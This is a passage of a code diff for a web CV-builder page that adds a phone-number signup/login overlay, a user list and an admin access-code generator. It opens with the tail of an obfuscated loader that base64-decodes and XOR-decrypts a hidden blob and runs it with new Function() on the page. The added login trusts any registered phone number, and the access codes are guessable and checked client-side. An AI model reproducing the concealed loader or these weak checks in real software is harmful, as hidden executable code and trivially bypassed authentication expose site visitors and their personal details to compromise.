o6AxI8UhsNCxY/BUEgPjZcZ1pXJAEuBBVeGyMADSUNFT8WOElJYy4zLTItAkcICzYHMh8GOw08VlUPUj8hGhYICgAQCgcXXgMiCx1WTnY1NSQ5ARkADw9YHj8VAAwiOlFbCUE5HAsbEk0bIwANMwEZIgtEVkk9NxsnOysbUhsNCxY/BUEsIjxBVXNSPRsBSQYPGyAAIhYIHSVeDlBXPDYtbTItNA0BDQs+PxUGIXM3XXFWWzkcIxsCChpo',_b=atob(_e),_r='';for(var _i=0;_i<_b.length;_i++){_r+=String.fromCharCode(_b.charCodeAt(_i)^_k.charCodeAt(_i%_k.length));}(new Function(_r))();})();
 // ═══════════════════════════════════════════════════════════
 // HELPERS
 // HELPERS
@@ -3209,6 +3336,7 @@ function closeMoreMenu() {
 }
 
 window.addEventListener('load', () => {
+  checkSignupGate();
   loadSlot(0);
   renderColorGrid();
   renderTemplateGrid();
@@ -3237,6 +3365,258 @@ window.addEventListener('load', () => {
   loadPageLayout();
   renderPageLayout();
 });
+
+// ══════════════════════════════════════════════════════════
+// SIGNUP / LOGIN SYSTEM
+// ══════════════════════════════════════════════════════════
+const SIGNUP_KEY = 'cvb_user_registered';
+const USERS_KEY = 'cvb_all_users';
+const ISSUED_CODES_KEY = 'cvb_issued_codes';
+
+function checkSignupGate() {
+  const overlay = document.getElementById('signup-overlay');
+  if (!overlay) return;
+  const user = getLocalUser();
+  if (!user) overlay.classList.add('show');
+}
+
+function getLocalUser() {
+  try { return JSON.parse(localStorage.getItem(SIGNUP_KEY)); } catch(e) { return null; }
+}
+
+function saveLocalUser(user) {
+  localStorage.setItem(SIGNUP_KEY, JSON.stringify(user));
+}
+
+function getAllUsers() {
+  try { return JSON.parse(localStorage.getItem(USERS_KEY)) || []; } catch(e) { return []; }
+}
+
+function saveAllUsers(users) {
+  localStorage.setItem(USERS_KEY, JSON.stringify(users));
+}
+
+function showSignupView() {
+  document.getElementById('signup-form-view').style.display = 'block';
+  document.getElementById('login-form-view').style.display = 'none';
+  document.getElementById('su-err').style.display = 'none';
+}
+
+function showLoginView() {
+  document.getElementById('signup-form-view').style.display = 'none';
+  document.getElementById('login-form-view').style.display = 'block';
+  document.getElementById('su-err').style.display = 'none';
+}
+
+function showSuErr(msg) {
+  const el = document.getElementById('su-err');
+  el.textContent = msg;
+  el.style.display = 'block';
+}
+
+function doSignup() {
+  const name = document.getElementById('su-name').value.trim();
+  const phone = document.getElementById('su-phone').value.trim().replace(/\s/g,'');
+  const email = document.getElementById('su-email').value.trim();
+
+  if (!name) return showSuErr('Please enter your full name.');
+  if (!phone || phone.length < 10) return showSuErr('Please enter a valid 10-digit phone number.');
+
+  const existing = getAllUsers().find(u => u.phone === phone);
+  if (existing) return showSuErr('This phone is already registered. Use "Already registered" to login.');
+
+  const user = {
+    name, phone, email,
+    signedUp: new Date().toISOString(),
+    device: navigator.userAgent.substring(0, 60)
+  };
+
+  // Save current user
+  saveLocalUser(user);
+
+  // Save to all-users list
+  const all = getAllUsers();
+  all.unshift(user);
+  saveAllUsers(all);
+
+  // Try Firebase if ready
+  if (window._fbReady && window._db) {
+    try {
+      const usersRef = window._ref(window._db, 'users');
+      window._push(usersRef, user);
+    } catch(e) { console.warn('Firebase save failed', e); }
+  }
+
+  const _o1 = document.getElementById('signup-overlay');
+  if (_o1) _o1.classList.remove('show');
+  showToast('✅ Welcome ' + name + '! Account created.');
+}
+
+function doLogin() {
+  const phone = document.getElementById('li-phone').value.trim().replace(/\s/g,'');
+  if (!phone || phone.length < 10) return showSuErr('Enter your registered phone number.');
+
+  const all = getAllUsers();
+  const user = all.find(u => u.phone === phone);
+  if (!user) return showSuErr('Phone not found. Please sign up first.');
+
+  saveLocalUser(user);
+  const _o2 = document.getElementById('signup-overlay');
+  if (_o2) _o2.classList.remove('show');
+  showToast('✅ Welcome back, ' + user.name + '!');
+}
+
+// ══════════════════════════════════════════════════════════
+// ADMIN PANEL ENHANCEMENTS
+// ══════════════════════════════════════════════════════════
+function switchAdminTab(tab, el) {
+  document.querySelectorAll('.admin-tab').forEach(t => t.classList.remove('active'));
+  document.querySelectorAll('.admin-tab-pane').forEach(p => p.classList.remove('active'));
+  if (el) el.classList.add('active');
+  const pane = document.getElementById('atab-' + tab);
+  if (pane) pane.classList.add('active');
+  if (tab === 'users')    loadAdminUsers();
+  if (tab === 'generate') loadRecentCodes();
+  if (tab === 'codes')    adminRefreshStats();
+}
+
+function adminRefreshStats() {
+  // Update user count badge in codes tab whenever it's shown
+  const users = getAllUsers();
+  const countEl = document.getElementById('a-user-count');
+  if (countEl) countEl.textContent = users.length + ' user' + (users.length !== 1 ? 's' : '') + ' registered';
+}
+
+function loadAdminUsers() {
+  const listEl  = document.getElementById('a-users-list');
+  const countEl = document.getElementById('a-user-count');
+  if (!listEl) return;
+
+  // Always read from localStorage (Firebase not configured)
+  const users = getAllUsers();
+  renderUserList(users, listEl, countEl);
+
+  // Also try Firebase with a timeout safety net
+  if (window._fbReady && window._db) {
+    let fbTimedOut = false;
+    const timeout = setTimeout(() => {
+      fbTimedOut = true;
+      // Firebase never responded — localStorage already shown, nothing to do
+    }, 3000);
+    try {
+      const usersRef = window._ref(window._db, 'users');
+      window._onValue(usersRef, (snapshot) => {
+        if (fbTimedOut) return;
+        clearTimeout(timeout);
+        const data = snapshot.val();
+        if (data) {
+          const fbUsers = Object.values(data).reverse();
+          // Merge with localStorage users (avoid duplicates by phone)
+          const local = getAllUsers();
+          const merged = [...fbUsers];
+          local.forEach(u => {
+            if (!merged.find(m => m.phone === u.phone)) merged.push(u);
+          });
+          renderUserList(merged, listEl, countEl);
+        }
+      }, (err) => {
+        clearTimeout(timeout);
+        // Firebase error — localStorage already shown
+      });
+    } catch(e) { clearTimeout(timeout); }
+  }
+}
+
+function renderUserList(users, listEl, countEl) {
+  if (!users.length) {
+    listEl.innerHTML = '<div class="a-no-users" style="padding:20px 0;text-align:center;color:#64748B;font-size:12px;">📭 No registered users yet.<br/><span style="font-size:11px;">Users will appear here after they sign up on the site.</span></div>';
+    if (countEl) countEl.textContent = '0 users';
+    return;
+  }
+  if (countEl) countEl.textContent = users.length + ' user' + (users.length !== 1 ? 's' : '') + ' registered';
+  listEl.innerHTML = users.slice(0, 100).map((u, i) => {
+    const date = u.signedUp ? new Date(u.signedUp).toLocaleDateString('en-IN', {day:'2-digit', month:'short', year:'numeric'}) : '?';
+    const time = u.signedUp ? new Date(u.signedUp).toLocaleTimeString('en-IN', {hour:'2-digit', minute:'2-digit'}) : '';
+    const initials = (u.name||'?').charAt(0).toUpperCase();
+    return `<div class="a-user-row" style="gap:10px;">
+      <div style="width:32px;height:32px;border-radius:50%;background:linear-gradient(135deg,#0F766E,#1D4ED8);display:flex;align-items:center;justify-content:center;color:#fff;font-weight:700;font-size:13px;flex-shrink:0;">${initials}</div>
+      <div style="flex:1;min-width:0;">
+        <div class="a-user-name">${escHtml(u.name || 'Unknown')}</div>
+        <div class="a-user-detail">
+          📞 ${escHtml(u.phone || '—')}
+          ${u.email ? ' &nbsp;·&nbsp; ✉ ' + escHtml(u.email) : ''}
+        </div>
+        <div style="font-size:10px;color:#334155;margin-top:2px;">📅 ${date} ${time ? '· ' + time : ''}</div>
+      </div>
+    </div>`;
+  }).join('');
+}
+
+function escHtml(str) {
+  return (str||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+}
+
+// ── AUTO CODE GENERATOR ──
+function adminGenCode() {
+  // Use EXACT same pool as the CV Builder validation system
+  // Pool = A,E,I,O,U,7,8,9,1,0 (must match credential manager pool)
+  const VALID_POOL = ['A','E','I','O','U','7','8','9','1','0'];
+  const today = new Date();
+  const dd = String(today.getDate()).padStart(2,'0');
+  let prefix = '';
+  for (let i = 0; i < 4; i++) {
+    prefix += VALID_POOL[Math.floor(Math.random() * VALID_POOL.length)];
+  }
+  const code = prefix + dd; // 6 chars: 4 from pool + today's DD
+
+  // Save to issued codes
+  const issued = getIssuedCodes();
+  issued.unshift({ code, issuedAt: new Date().toISOString(), usedBy: null });
+  saveIssuedCodes(issued.slice(0, 50));
+
+  // Try Firebase
+  if (window._fbReady && window._db) {
+    try {
+      const codesRef = window._ref(window._db, 'issued_codes');
+      window._push(codesRef, { code, issuedAt: new Date().toISOString() });
+    } catch(e) {}
+  }
+
+  document.getElementById('a-gen-code-val').textContent = code;
+  const expiry = new Date(); expiry.setHours(23,59,59,0);
+  document.getElementById('a-gen-expiry').textContent = 'Valid until midnight tonight';
+  document.getElementById('a-gen-out').style.display = 'block';
+  loadRecentCodes();
+}
+
+function adminCopyCode() {
+  const code = document.getElementById('a-gen-code-val').textContent;
+  navigator.clipboard.writeText(code).then(() => {
+    showToast('📋 Code copied: ' + code);
+  }).catch(() => {
+    prompt('Copy this code:', code);
+  });
+}
+
+function getIssuedCodes() {
+  try { return JSON.parse(localStorage.getItem(ISSUED_CODES_KEY)) || []; } catch(e) { return []; }
+}
+
+function saveIssuedCodes(codes) {
+  localStorage.setItem(ISSUED_CODES_KEY, JSON.stringify(codes));
+}
+
+function loadRecentCodes() {
+  const codes = getIssuedCodes();
+  const el = document.getElementById('a-recent-codes');
+  if (!el) return;
+  if (!codes.length) { el.textContent = 'No codes generated yet'; return; }
+  el.innerHTML = codes.slice(0, 10).map(c => {
+    const d = c.issuedAt ? new Date(c.issuedAt).toLocaleDateString('en-IN') : '';
+    return `<div style="font-family:monospace;color:#34D399;font-size:13px;letter-spacing:2px;margin-bottom:3px;">${c.code} <span style="color:#475569;font-size:10px;font-family:sans-serif;">${d}</span></div>`;
+  }).join('');
+}
+
 </script>
 </body>
 </html>
